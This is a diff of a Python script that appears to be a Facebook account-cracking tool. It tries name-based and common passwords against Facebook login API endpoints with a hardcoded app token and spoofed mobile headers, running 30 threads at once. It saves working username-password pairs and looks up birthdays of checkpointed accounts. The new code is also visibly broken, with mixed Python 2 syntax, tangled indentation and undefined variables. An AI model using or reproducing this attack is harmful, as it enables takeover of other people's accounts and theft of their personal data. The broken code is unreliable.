@@ -306,56 +306,71 @@ def bapi(user):
 		ua = open(".ua", "r").read()
 	except IOError:
 		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
-	global loop, token
-	sys.stdout.write(
-		"\r * crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
-	); sys.stdout.flush()
-	uid, name = user.split("<=>")
-	if len(name)>=6:
-		pwx = [ name+"123", name+"1234", name+"12345" ]
-	elif len(name)<=2:
-		pwx = [ name+"123", name+"1234", name+"12345" ]
-	elif len(name)<=3:
-		pwx = [ name+"123", name+"12345" ]
-	else:
-		pwx = [ name+"123", name+"12345" ]
-	try:
-		for pw in pwx:
-			pw = pw.lower()
-			ses = requests.Session()
-			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
-			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
-			if "session_key" in send.text and "EAAA" in send.text:
-				print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
-				ok.append("%s|%s"%(uid, pw))
-				open("OK/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
-				break
-				continue
-			elif "www.facebook.com" in send.json()["error_msg"]:
-				try:
-					token = open("login.txt", "r").read()
-					with requests.Session() as ses:
-						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
-						month, day, year = ttl.split("/")
-						month = bulan_ttl[month]
-						print("\r \033[0;93m+ %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
-						cp.append("%s|%s"%(uid, pw))
-						open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+		global ok,cp,ua, loop
+                print '\r\033[0;95m[\033[0;97mCrack\033[0;95m] \033[0;97m %s/%s | OK : %s | CP : %s ' %  (loop, len(id), len(ok), len(cp)),
+		sys.stdout.flush()
+		user = arg
+		uid,name=user.split("|") 
+		try:
+			os.mkdir('out')
+		except OSError:
+			pass
+		try:
+			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower() ,'sayang','bismillah','123456','kontol']:
+				ua = 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.0.1.54'
+				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
+				'x-fb-net-hni': str(random.randint(20000, 40000)), 
+				'x-fb-connection-quality': 'EXCELLENT', 
+				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
+				'user-agent': ua, 
+				'content-type': 'application/x-www-form-urlencoded', 
+				'x-fb-http-engine': 'Liger'}
+				ses=requests.Session()
+				api="https://mbasic.facebook.com/method/auth.login"
+				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
+				send=ses.get(api,params=param, headers=headers_)
+				if "access_token" in send.text and "EAAA" in send.text:
+					print '\r\033[0;97m\033[0;96mok\033[0;97m\033[0;97m ' +uid+ ' • ' + pw+  ''
+					ok.append(uid+' • '+pw+'•'+ttl)
+					save = open('OK.txt','a') 
+					save.write('[OK] '+str(uid)+' • '+str(pw)+'\n')
+					save.close()
+					break
+					continue
+					continue
+				elif "www.facebook.com" in send.json()["error_msg"]:
+					try:
+						token = open('login.txt').read()
+						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
+						data = s.get(url).json()
+						nama = data['name']
+						ttl = data['birthday'].replace("/","-")
+						print('\r\033[1;93m[CP] ' +uid+ '•' + pw + '')
+						cp.append(uid+'•'+pw+'')
+						save = open('CP.txt' ,'a')
+						save.write('[CP] '+str(uid)+'•'+str(pw)+'\n')
+						save.close()
 						break
-				except (KeyError, IOError):
-					day = (" ")
-					month = (" ")
-					year = (" ")
-				except:pass
-				print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
-				cp.append("%s|%s"%(uid, pw))
-				open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
-				break
-				continue
+					except(KeyError, IOError):
+						ttl = ' '
+					except:pass
+					print '\r\033[0;95m[\033[0;97mCP\033[0;95m]\033[0;97m ' +uid+ ' • ' + pw + ''
+					cp.append(uid+' • '+pw)
+					save = open('CP.txt' ,'a') 
+					save.write('[CP] '+str(uid)+' • '+str(pw)+'\n')
+					save.close()
+					break
+					continue
+			
+			loop += 1
+		except:
+			pass
+	p = ThreadPool(30)
+	p.map(main, id)
+        jalan('\n \033[0;97m[\033[0;95m+\033[0;97m] Crack Selesai... ')
+        raw_input(' [ \033[0;95m KEMBALI \033[0;97m ] ')
+        menu()
 
-		loop += 1
-	except:
-		pass
 
 def mbasic(user):
 	try:
